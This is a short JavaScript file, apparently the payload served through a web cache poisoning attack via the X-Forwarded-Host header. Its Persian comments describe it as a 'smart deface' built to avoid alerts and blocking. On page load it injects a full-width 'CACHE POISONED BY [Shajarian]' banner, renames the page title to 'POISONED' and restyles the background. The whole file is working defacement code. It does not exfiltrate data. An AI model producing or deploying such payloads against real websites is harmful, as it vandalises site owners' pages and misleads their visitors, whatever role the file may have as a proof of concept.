// index.js — دیفیس هوشمند (بدون alert، بدون بلاک شدن)
(function () {
    // ایجاد بَنِر بالای صفحه
    const banner = document.createElement('div');
    banner.innerHTML = `
        <div style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background: #000;
            color: #ff0044;
            font-family: 'Courier New', monospace;
            font-size: 20px;
            text-align: center;
            padding: 12px 0;
            z-index: 99999;
            border-bottom: 3px solid #ff5555;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        ">
            CACHE POISONED BY [Shajarian] — NEVER TRUST X-FORWARDED-HOST!
        </div>
    `;
    document.body.insertBefore(banner.firstChild, document.body.firstChild);

    // تغییر عنوان صفحه
    document.title = "☠️ POISONED ☠️";

    // تغییر پس‌زمینه (اختیاری — جذابیت بیشتر)
    document.body.style.background = "radial-gradient(circle, #111, #000)";
})();